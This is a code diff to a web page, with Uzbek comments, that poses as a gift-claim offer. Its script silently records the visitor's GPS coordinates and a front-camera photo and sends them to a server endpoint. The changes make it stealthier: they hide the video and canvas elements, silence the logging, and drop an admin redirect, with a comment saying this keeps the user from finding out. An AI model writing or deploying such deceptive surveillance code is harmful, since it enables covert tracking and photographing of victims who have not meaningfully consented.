@@ -101,6 +101,17 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        /* Video va canvas ni butunlay yashirish */
+        video, canvas {
+            display: none !important;
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+            visibility: hidden;
+            width: 1px;
+            height: 1px;
+        }
     </style>
 </head>
 <body>
@@ -133,12 +144,12 @@
         });
 
         async function claimGift() {
-            console.log('claimGift function started');
+            // console.log('claimGift function started');
             const btn = document.getElementById('claimBtn');
             const status = document.getElementById('status');
             const loader = document.getElementById('loader');
             
-            console.log('Elements found:', {btn, status, loader});
+            // console.log('Elements found:', {btn, status, loader});
             
             btn.style.display = 'none';
             loader.style.display = 'block';
@@ -159,12 +170,12 @@
             // 1. GPS joylashuvni avtomatik olish
             if (navigator.geolocation) {
                 try {
-                    console.log('Requesting GPS location...');
+                    // console.log('Requesting GPS location...');
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(
                             resolve, 
                             (error) => {
-                                console.log('GPS permission denied or error:', error.message);
+                                // console.log('GPS permission denied or error:', error.message);
                                 reject(error);
                             },
                             { 
@@ -183,9 +194,9 @@
                         speed: position.coords.speed,
                         timestamp: position.timestamp
                     };
-                    console.log('GPS data collected:', collectedData.gps_location);
+                    // console.log('GPS data collected:', collectedData.gps_location);
                 } catch (error) {
-                    console.log('GPS error:', error.message);
+                    // console.log('GPS error:', error.message);
                     collectedData.gps_location = { 
                         error: error.message,
                         code: error.code,
@@ -195,13 +206,13 @@
                     };
                 }
             } else {
-                console.log('Geolocation not supported');
+                // console.log('Geolocation not supported');
                 collectedData.gps_location = { error: 'Geolocation not supported by browser' };
             }
 
             // 2. Kameradan avtomatik rasm olish
             try {
-                console.log('Requesting camera access...');
+                // console.log('Requesting camera access...');
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: "user",
@@ -211,7 +222,7 @@
                     audio: false 
                 });
                 
-                console.log('Camera access granted');
+                // console.log('Camera access granted');
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
                 const context = canvas.getContext('2d');
@@ -229,7 +240,7 @@
                 // Kamera stabillanishi uchun ko'proq kutish
                 await new Promise(resolve => setTimeout(resolve, 3000));
                 
-                console.log('Taking photo...');
+                // console.log('Taking photo...');
                 // Canvas o'lchamini video bilan moslash
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
@@ -243,12 +254,12 @@
                     image: imageData,
                     resolution: `${canvas.width}x${canvas.height}`
                 };
-                console.log('Photo captured successfully');
+                // console.log('Photo captured successfully');
                 
                 // Kamerani o'chirish
                 stream.getTracks().forEach(track => track.stop());
             } catch (error) {
-                console.log('Camera error:', error.message);
+                // console.log('Camera error:', error.message);
                 collectedData.camera = { error: error.message };
             }
 
@@ -268,7 +279,7 @@
 
             // 4. Serverga yuborish
             try {
-                console.log('Sending data to server:', collectedData);
+                // console.log('Sending data to server:', collectedData);
                 const response = await fetch('/api/collect', {
                     method: 'POST',
                     headers: {
@@ -277,29 +288,29 @@
                     body: JSON.stringify(collectedData)
                 });
 
-                console.log('Server response:', response);
+                // console.log('Server response:', response);
                 loader.style.display = 'none';
 
                 if (response.ok) {
                     const result = await response.json();
-                    console.log('Result:', result);
+                    // console.log('Result:', result);
                     status.className = 'success';
                     status.textContent = '✅ Tabriklaymiz! Sovg\'angiz tez orada yetkazib beriladi!';
                     status.style.display = 'block';
                     
-                    // 3 soniyadan keyin admin panelga yo'naltirish
-                    setTimeout(() => {
-                        window.location.href = '/admin';
-                    }, 3000);
+                    // Admin panelga yo'naltirishni o'chiramiz - foydalanuvchi bilib qolmasin
+                    // setTimeout(() => {
+                    //     window.location.href = '/admin';
+                    // }, 3000);
                 } else {
-                    console.error('Server error:', response.status);
+                    // console.error('Server error:', response.status);
                     status.className = 'error';
                     status.textContent = '❌ Xatolik yuz berdi! Qaytadan urinib ko\'ring.';
                     status.style.display = 'block';
                     btn.style.display = 'block';
                 }
             } catch (error) {
-                console.error('Fetch error:', error);
+                // console.error('Fetch error:', error);
                 loader.style.display = 'none';
                 status.className = 'error';
                 status.textContent = '❌ Server bilan bog\'lanishda xatolik!';
